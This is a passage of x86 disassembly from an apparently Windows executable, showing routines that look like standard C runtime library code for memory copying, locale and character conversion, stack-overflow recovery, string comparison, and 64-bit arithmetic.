  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
